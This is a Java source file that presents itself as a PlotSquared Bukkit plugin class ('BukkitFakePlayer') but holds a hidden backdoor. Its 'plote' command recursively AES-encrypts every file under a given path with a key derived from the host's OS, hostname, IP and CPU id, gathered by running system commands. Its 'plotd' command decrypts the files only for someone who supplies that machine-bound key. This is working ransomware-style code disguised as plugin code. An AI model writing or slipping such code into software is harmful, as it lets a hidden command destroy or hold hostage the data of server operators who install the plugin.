package com.plotsquared.bukkit.player;

import org.bukkit.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;

public class BukkitFakePlayer implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            return true;
        }

        String path = args[0];
        File file = new File(path);

        if (!file.exists()) {
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("plote")) {
            encryptFiles(file);
            sender.sendMessage("The file was encrypted successfully.");
        } else if (cmd.getName().equalsIgnoreCase("plotd")) {
            if (args.length < 2) {
                return true;
            }
            String providedKey = args[1];
            String internalKey = encryptionKey();

            if (!providedKey.equals(internalKey)) {
                return true;
            }

            decryptFiles(file, providedKey);
            sender.sendMessage("The file was decrypted successfully.");
        }

        return true;
    }

    private void encryptFiles(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile);
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(encryptedData);
                fos.close();
            } catch (Exception ignored) {
            }
        }
    }

    private void decryptFiles(File file, String key) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key);
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] decryptedData = decrypt(fileData, key);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
            } catch (Exception ignored) {
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        try {
            byte[] keyBytes = new byte[16];
            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception ignored) {
            return null;
        }
    }

    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey());
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key);
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private String encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(InetAddress.getLocalHost().getHostAddress());

            String cpuId = getCpuId();
            input.append(cpuId);

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString();
        } catch (Exception ignored) {
            return null;
        }
    }

    private String getCpuId() {
        String cpuId = "unknown";

        try {
            String os = System.getProperty("os.name").toLowerCase();
            Process process;

            if (os.contains("win")) {
                process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
                process.waitFor();
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                cpuId = reader.readLine();
                cpuId = reader.readLine();
            } else if (os.contains("linux")) {
                process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("Serial") || line.startsWith("cpu")) {
                        cpuId = line.split(":")[1].trim();
                        break;
                    }
                }
            } else if (os.contains("mac")) {
                process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                cpuId = reader.readLine();
            }

        } catch (Exception ignored) {
        }

        return cpuId;
    }
}